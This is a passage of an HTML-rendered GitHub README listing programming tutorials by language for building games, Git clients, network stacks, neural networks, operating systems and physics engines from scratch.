&lt;h4&gt;&lt;a id="user-content-build-your-own-game" class="anchor" aria-hidden="true" href="#build-your-own-game"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Game&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://handmadehero.org/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Handmade Hero&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://nesdoug.com/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;How to Program an NES game in C&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLZ1QII7yudbc-Ky058TEaOstZHVbT-2hg" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Chess Engine In C&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLSkJey49cOgTSj465v2KbLZ7LMn10bCF9" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Let's Make: Dangerous Dave&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLT6WFYYZE6uLMcPGS3qfpYm7T_gViYMMt" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Learn Video Game Programming in C&lt;/em&gt;&lt;/a&gt;
[video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLkTXsX7igf8edTYU92nU-f5Ntzuf-RKvW" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Coding A Sudoku Solver in C&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLkTXsX7igf8erbWGYT4iSAhpnJLJ0Nk5G" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Coding a Rogue/Nethack RPG in C&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://brennan.io/2015/06/12/tetris-reimplementation/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;On Tetris and Reimplementation&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://learnopengl.com/In-Practice/2D-Game/Breakout" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Breakout&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://lazyfoo.net/tutorials/SDL/" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Beginning Game Programming v2.0&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://javilop.com/gamedev/tetris-tutorial-in-c-platform-independent-focused-in-game-logic-for-beginners/" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Tetris tutorial in C++ platform independent focused in game logic for beginners&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=ETvApbD5xRo&amp;amp;list=PLNOBk_id22bw6LXhrGfhVwqQIa-M2MsLa" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Remaking Cavestory in C++&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PL006xsVEsbKjSKBmLu1clo85yLrwjY67X" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Reconstructing Cave Story&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nicktasios.nl/posts/space-invaders-from-scratch-part-1.html" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Space Invaders from Scratch&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://scottlilly.com/learn-c-by-building-a-simple-rpg-index/" rel="nofollow"&gt;&lt;strong&gt;C#&lt;/strong&gt;: &lt;em&gt;Learn C# by Building a Simple RPG&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://roguesharp.wordpress.com/" rel="nofollow"&gt;&lt;strong&gt;C#&lt;/strong&gt;: &lt;em&gt;Creating a Roguelike Game in C#&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://scottlilly.com/build-a-cwpf-rpg/" rel="nofollow"&gt;&lt;strong&gt;C#&lt;/strong&gt;: &lt;em&gt;Build a C#/WPF RPG&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://gameswithgo.org/" rel="nofollow"&gt;&lt;strong&gt;Go&lt;/strong&gt;: &lt;em&gt;Games With Go&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://lwjglgamedev.gitbooks.io/3d-game-development-with-lwjgl/content/" rel="nofollow"&gt;&lt;strong&gt;Java&lt;/strong&gt;: &lt;em&gt;3D Game Development with LWJGL 3&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Games/Tutorials/2D_breakout_game_Phaser" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;2D breakout game using Phaser&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.lessmilk.com/tutorial/flappy-bird-phaser-1" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;How to Make Flappy Bird in HTML5 With Phaser&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://auth0.com/blog/developing-games-with-react-redux-and-svg-part-1/" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Developing Games with React, Redux, and SVG&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=aXwCrtAo4Wc" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Build your own 8-Ball Pool game from scratch&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://gamedevelopment.tutsplus.com/tutorials/how-to-make-your-first-roguelike--gamedev-13677" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;How to Make Your First Roguelike&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.freecodecamp.org/think-like-a-programmer-how-to-build-snake-using-only-javascript-html-and-css-7b1479c3339e" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Think like a programmer: How to build Snake using only JavaScript, HTML &amp;amp; CSS&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/SSYGEN/blog/issues/30"&gt;&lt;strong&gt;Lua&lt;/strong&gt;: &lt;em&gt;BYTEPATH&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pythonprogramming.net/pygame-python-3-part-1-intro/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Developing Games With PyGame&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://inventwithpython.com/makinggames.pdf" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Making Games with Python &amp;amp; Pygame&lt;/em&gt;&lt;/a&gt; [pdf]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLKUel_nHsTQ1yX7tQxR_SQRdcOFyXfNAb" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;The Complete Roguelike Tutorial&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="http://rogueliketutorials.com/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Roguelike Tutorial Revised&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://leanpub.com/developing-games-with-ruby/read" rel="nofollow"&gt;&lt;strong&gt;Ruby&lt;/strong&gt;: &lt;em&gt;Developing Games With Ruby&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.diatomenterprises.com/gamedev-on-ruby-why-not/" rel="nofollow"&gt;&lt;strong&gt;Ruby&lt;/strong&gt;: &lt;em&gt;Ruby Snake&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://a5huynh.github.io/2018/02/02/adventures-in-rust.html" rel="nofollow"&gt;&lt;strong&gt;Rust&lt;/strong&gt;: &lt;em&gt;Adventures in Rust: A Basic 2D Game&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://tomassedovic.github.io/roguelike-tutorial/" rel="nofollow"&gt;&lt;strong&gt;Rust&lt;/strong&gt;: &lt;em&gt;Roguelike Tutorial in Rust + tcod&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-git" class="anchor" aria-hidden="true" href="#build-your-own-git"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Git&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stefan.saasen.me/articles/git-clone-in-haskell-from-the-bottom-up/" rel="nofollow"&gt;&lt;strong&gt;Haskell&lt;/strong&gt;: &lt;em&gt;Reimplementing “git clone” in Haskell from the bottom up&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://gitlet.maryrosecook.com/docs/gitlet.html" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Gitlet&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://kushagragour.in/blog/2014/01/build-git-learn-git/" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Build GIT - Learn GIT&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://benhoyt.com/writings/pygit/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Just enough of a Git client to create a repo, commit, and push itself to GitHub&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wyag.thb.lt/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Write yourself a Git!&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://robots.thoughtbot.com/rebuilding-git-in-ruby" rel="nofollow"&gt;&lt;strong&gt;Ruby&lt;/strong&gt;: &lt;em&gt;Rebuilding Git in Ruby&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-network-stack" class="anchor" aria-hidden="true" href="#build-your-own-network-stack"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Network Stack&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://beej.us/guide/bgnet/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Beej's Guide to Network Programming&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Let's code a TCP/IP stack&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/geckoboard-under-the-hood/how-to-build-a-network-stack-in-ruby-f73aeb1b661b" rel="nofollow"&gt;&lt;strong&gt;Ruby&lt;/strong&gt;: &lt;em&gt;How to build a network stack in Ruby&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-neural-network" class="anchor" aria-hidden="true" href="#build-your-own-neural-network"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Neural Network&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.codeproject.com/Articles/11285/Neural-Network-OCR" rel="nofollow"&gt;&lt;strong&gt;C#&lt;/strong&gt;: &lt;em&gt;Neural Network OCR&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://towardsdatascience.com/building-neural-networks-in-f-part-1-a2832ae972e6" rel="nofollow"&gt;&lt;strong&gt;F#&lt;/strong&gt;: &lt;em&gt;Building Neural Networks in F#&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://made2591.github.io/posts/neuralnetwork" rel="nofollow"&gt;&lt;strong&gt;Go&lt;/strong&gt;: &lt;em&gt;Build a multilayer perceptron with Golang&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://sausheong.github.io/posts/how-to-build-a-simple-artificial-neural-network-with-go/" rel="nofollow"&gt;&lt;strong&gt;Go&lt;/strong&gt;: &lt;em&gt;How to build a simple artificial neural network with Go&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://datadan.io/neural-net-with-go" rel="nofollow"&gt;&lt;strong&gt;Go&lt;/strong&gt;: &lt;em&gt;Building a Neural Net from Scratch in Go&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLRqwX-V7Uu6aCibgK1PTWWu9by6XFdCfh" rel="nofollow"&gt;&lt;strong&gt;JavaScript / Java&lt;/strong&gt;: &lt;em&gt;Neural Networks - The Nature of Code&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://franpapers.com/en/machine-learning-ai-en/2017-neural-network-implementation-in-javascript-by-an-example/" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Neural Network implementation in JavaScript, by an example&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hackernoon.com/neural-networks-from-scratch-for-javascript-linguists-part1-the-perceptron-632a4d1fbad2" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Neural networks from scratch for JavaScript linguists (Part1 — The Perceptron)&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://iamtrask.github.io/2015/07/12/basic-python-network/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;A Neural Network in 11 lines of Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://victorzhou.com/blog/intro-to-neural-networks/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Implement a Neural Network from Scratch&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://aosabook.org/en/500L/optical-character-recognition-ocr.html" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Optical Character Recognition (OCR)&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://navoshta.com/traffic-signs-classification/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Traffic signs classification with a convolutional network&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://towardsdatascience.com/how-to-generate-music-using-a-lstm-neural-network-in-keras-68786834d4c5" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Generate Music using LSTM Neural Network in Keras&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://victorzhou.com/blog/intro-to-cnns-part-1/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;An Introduction to Convolutional Neural Networks&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-operating-system" class="anchor" aria-hidden="true" href="#build-your-own-operating-system"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Operating System&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://joebergeron.io/posts/post_two.html" rel="nofollow"&gt;&lt;strong&gt;Assembly&lt;/strong&gt;: &lt;em&gt;Writing a Tiny x86 Bootloader&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cl.cam.ac.uk/projects/raspberrypi/tutorials/os/index.html" rel="nofollow"&gt;&lt;strong&gt;Assembly&lt;/strong&gt;: &lt;em&gt;Baking Pi – Operating Systems Development&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=ZjwvMcP3Nf0&amp;amp;list=PLU94OURih-CiP4WxKSMt3UcwMSDM3aTtX" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Building a software and hardware stack for a simple computer from scratch&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://tuhdo.github.io/os01/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Operating Systems: From 0 to 1&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://littleosbook.github.io/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;The little book about OS development&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://jamesmolloy.co.uk/tutorial_html/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Roll your own toy UNIX-clone OS&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://arjunsreedharan.org/post/82710718100/kernel-101-lets-write-a-kernel" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Kernel 101 – Let’s write a Kernel&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://arjunsreedharan.org/post/99370248137/kernel-201-lets-write-a-kernel-with-keyboard" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Kernel 201 – Let’s write a Kernel with keyboard and screen support&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jserv/mini-arm-os"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Build a minimal multi-tasking kernel for ARM from scratch&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/cfenollosa/os-tutorial"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;How to create an OS from scratch&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://danluu.com/malloc-tutorial/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Malloc tutorial&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.holbertonschool.com/hack-the-virtual-memory-c-strings-proc/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Hack the virtual memory&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/s-matyukevich/raspberry-pi-os"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Learning operating system development using Linux kernel and Raspberry Pi&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@lduck11007/operating-systems-development-for-dummies-3d4d786e8ac" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Operating systems development for Dummies&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLHh55M_Kq4OApWScZyPl5HhgsTJS9MZ6M" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Write your own Operating System&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="http://3zanders.co.uk/2017/10/13/writing-a-bootloader/" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Writing a Bootloader&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://os.phil-opp.com/" rel="nofollow"&gt;&lt;strong&gt;Rust&lt;/strong&gt;: &lt;em&gt;Writing an OS in Rust&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-physics-engine" class="anchor" aria-hidden="true" href="#build-your-own-physics-engine"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Physics Engine&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.toptal.com/game/video-game-physics-part-i-an-introduction-to-rigid-body-dynamics" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Video Game Physics Tutorial&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://allenchou.net/game-physics-series/" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Game physics series by Allen Chou&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://gamedevelopment.tutsplus.com/series/how-to-create-a-custom-physics-engine--gamedev-12715" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;How to Create a Custom Physics Engine&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLEETnX-uPtBXm1KEr_2zQ6K_0hoGH6JJ0" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;3D Physics Engine Tutorial&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://mattmakesgames.tumblr.com/post/127890619821/towerfall-physics" rel="nofollow"&gt;&lt;strong&gt;C#&lt;/strong&gt;: &lt;em&gt;TowerFall Physics&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.graphitedigital.com/blog/build-your-own-basic-physics-engine-in-javascript" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Build your own basic physics engine in JavaScript&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://buildnewgames.com/gamephysics/" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;How Physics Engines Work&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://buildnewgames.com/broad-phase-collision-detection/" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Broad Phase Collision Detection Using Spatial Partitioning&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ibm.com/developerworks/library/wa-build2dphysicsengine/index.html" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Build a simple 2D physics engine for JavaScript games&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
